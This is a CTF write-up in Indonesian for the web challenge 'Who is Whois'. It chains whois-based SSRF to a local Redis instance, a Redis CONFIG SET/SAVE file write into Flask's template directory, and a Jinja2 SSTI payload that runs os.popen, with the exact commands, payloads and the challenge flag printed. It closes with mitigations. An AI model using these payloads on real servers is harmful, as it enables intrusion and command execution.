---
ctf: "NoHackNoCTF 2026 (NHNC)"
kategori: "Web Exploitation"
challenge: "Who is Whois"
flag: "NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_c96e6295f10f4d31bc48202f9772d8c7}"
teknik: "whois -h/-p sebagai TCP client → SSRF ke Redis lokal → CONFIG SET dir + SAVE menulis RDB ke folder template Flask → Jinja2 SSTI dengan request.args untuk menyelundupkan string terblokir"
---

# Who is Whois — NoHackNoCTF 2026 (Web Exploitation)

## Deskripsi Singkat

Sebuah lookup whois Flask dengan jail input yang agresif. Filter-nya memblokir `_`, `/`, `'`, `"`, `;`, `<`, `>`, `=`, `#`, `[`, `]`, dan token case-insensitive `flag`, `read`, `popen`, `system`, `exec`, `eval`, `subprocess`, `import`. Tapi field itu diberikan ke `/usr/bin/whois`, yang menerima `-h HOST -p PORT OBJECT` dan karenanya adalah TCP client. Arahkan ke Redis lokal, tanam payload SSTI ke dalam file RDB di dalam direktori template Flask, render lewat Jinja2 via `/render?tpl=shell`, selundupkan setiap string yang diblokir lewat `request.args`.

## Analisis

**Langkah 1 — Jadikan whois sebuah TCP client.** Spasi (`0x20`) tidak diblokir. `-h`, `-p`, dan string angka pendek lolos jail karakter:

```
POST /api/whois  domain=-h 127.0.0.1 -p 6379 PING
+PONG
POST /api/whois  domain=-h 127.0.0.1 -p 6379 INFO
# redis_version:6.2.22 ...
POST /api/whois  domain=-h 127.0.0.1 -p 6379 COMMAND COUNT
:214
```

Redis lokal dengan 214 command tersedia. `MODULE`, `SCRIPT`, `KEYS`, `FLUSHALL` di-rename dan tidak bisa dijangkau, tapi `CONFIG`, `SET`, `SAVE`, `APPEND`, `SCAN`, `CLIENT` semuanya berfungsi. Catatan: `whois` melewatkan argumennya lewat lowercasing, jadi identifier huruf besar mana pun yang penting harus tetap bertahan di lowercase atau diselundupkan lewat kanal lain.

**Langkah 2 — Temukan root template.** `GET /render?tpl=whatever` untuk nama apa pun yang tidak dikenal mengembalikan `template not found: /app/tpl/whatever.tpl`, memberi tahu root template yang persis (`/app/tpl/`) dan ekstensinya (`.tpl`). Path traversal ke `?tpl=..%2fflag` resolve tapi tetap gagal, jadi kita perlu menulis file `.tpl` *baru* yang akan ditemukan loader Flask.

**Langkah 3 — Redis SAVE ke `/app/tpl/shell.tpl`.** Jail input secara spesifik meng-allowlist string `CONFIG SET dir /app/tpl`. Nilai `dir` lainnya (`/tmp`, `/etc`, `/app`) ditolak. Satu entri allowlist itu mendaratkan RDB persis di folder tempat Flask membaca template:

```
domain=-h 127.0.0.1 -p 6379 CONFIG SET dir /app/tpl        →  +OK
domain=-h 127.0.0.1 -p 6379 CONFIG SET dbfilename shell.tpl →  +OK
domain=-h 127.0.0.1 -p 6379 SET z aaa{{PAYLOAD}}bbb        →  +OK
domain=-h 127.0.0.1 -p 6379 SAVE                            →  +OK
```

`GET /render?tpl=shell` membaca RDB tersebut sebagai template. Byte-nya berisik (magic RDB, length prefix, UTF-8 tidak valid diganti U+FFFD), tapi Jinja2 memperlakukan segala sesuatu di luar `{{...}}` sebagai output literal, jadi payload kita bertahan verbatim di antara marker `aaa`/`bbb`.

**Langkah 4 — Bypass jail karakter & token dengan `request.args`.** SSTI Jinja2 klasik butuh underscore (`__class__`, `__mro__`, `__globals__`, `__builtins__`) dan string seperti `os`, `popen`, `flag`. Semuanya diblokir jail. Tapi jail-nya hanya melihat nilai yang disimpan; panggilan *render* juga punya akses ke `request.args`, dan query string tidak pernah melewati jail:

```jinja
{{ request.args.g }}   →  __globals__   (ketika ?g=__globals__)
{{ request.args.b }}   →  __builtins__
{{ request.args.o }}   →  os
{{ request.args.p }}   →  popen
{{ request.args.c }}   →  /flag
```

Setiap string terblokir diselundupkan sebagai parameter URL; payload-nya hanya merujuknya secara simbolik.

**Langkah 5 — Pivot ke Python globals lewat `lipsum`.** Context Jinja2 milik Flask punya `lipsum` (`jinja2.utils.generate_lorem_ipsum`), sebuah fungsi Python biasa. `__globals__`-nya adalah dict modul `jinja2/utils.py`, yang sudah `import os` di scope modul. Jadi:

```jinja
{{ lipsum|attr(request.args.g) }}         →  <module dict>
{{ (lipsum|attr(request.args.g))|list }}  →  [..., 'os', ...]
```

Modul `os` ada di dict tersebut. Tapi `|attr(name)` hanya melakukan `getattr`, dan `dict.os` bukan attribute (`dict.__getitem__` akan berfungsi tapi itu tidak bisa diakses tanpa `[`). Jadi `.get(name)` adalah pivot yang tepat, karena itu method biasa:

```jinja
{{ (lipsum|attr(request.args.g)).get(request.args.o) }}   →  <module 'os'>
```

Presedensi parser: `|` mengikat lebih longgar dari `.`, jadi `lipsum|attr(g).items` diparse sebagai `lipsum | attr(g.items)`. Setiap rantai filter harus diberi tanda kurung untuk memaksa presedensi yang benar.

## Eksploitasi / Solusi

Lewati `.read()` (substring terblokir) dengan memanfaatkan fakta bahwa `os.popen(cmd)` mengembalikan sesuatu yang bisa diiterasi; `|list` mengiterasinya jadi list Python dan mencetaknya:

**Tersimpan di Redis (di dalam RDB, di antara marker aaa/bbb):**

```jinja
{{ ((lipsum|attr(request.args.g)).get(request.args.o)
     |attr(request.args.p))(request.args.c)|list }}
```

**Dikirim sebagai request render:**

```
GET /render?tpl=shell&g=__globals__&o=os&p=popen&c=/flag
```

Ekspansi saat render:

```
lipsum.__globals__            (filter attr dengan nama dari query)
       .get("os")             (dict.get mengembalikan modul os)
       |attr("popen")         (filter → os.popen)
       ("/flag")              (panggil fungsinya)
       |list                  (ubah pipe iterator jadi list)
```

Output di antara marker:

```
['NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_c96e6295f10f4d31bc48202f9772d8c7}\n']
```

## Catatan / Insight

Tiga keputusan independen harus tersusun bersama: `whois` adalah TCP client, Redis ada di localhost dengan `CONFIG` masih bisa dijangkau, dan template loader Flask membaca dari direktori yang bisa ditulis oleh Redis SAVE. Perbaiki salah satu dari ketiganya saja, seluruh rantainya tertutup: parse domain dengan library alih-alih shell-out; rename `CONFIG` jadi `""`; jadikan `/app/tpl` bind mount read-only.

## Flag

```
NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_c96e6295f10f4d31bc48202f9772d8c7}
```
